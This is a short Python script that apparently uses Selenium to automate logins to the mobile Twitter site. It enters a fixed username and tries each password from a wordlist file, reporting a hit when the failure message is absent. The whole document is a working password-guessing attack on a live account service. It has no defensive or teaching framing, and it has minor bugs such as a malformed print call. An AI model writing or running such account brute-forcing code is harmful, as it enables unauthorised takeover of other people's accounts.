from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.keys import Keys

driver = webdriver.Firefox(executable_path=r'C:\Users\Conrad\WebDriver\bin\geckodriver.exe')

def main(password):
    driver.get("http://mobile.twitter.com/login")

    waitForLoad = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.NAME, "session[username_or_email]"))
    )

    driver.find_element_by_name('session[username_or_email]').send_keys("cnrad");
    driver.find_element_by_name('session[password]').send_keys(password);

    driver.find_element_by_name('session[password]').send_keys(Keys.RETURN);

    wait = WebDriverWait(driver, 10)
    wait.until(EC.url_changes('https://current_page.com'))

    if "did not match our records" in driver.page_source:
        print("%s -------- WRONG", password)
    else:
        print("%s -------- FOUND??", password)
        exit(1)


with open("pass.txt", "r") as list:
    for line in list:
        main(line.strip())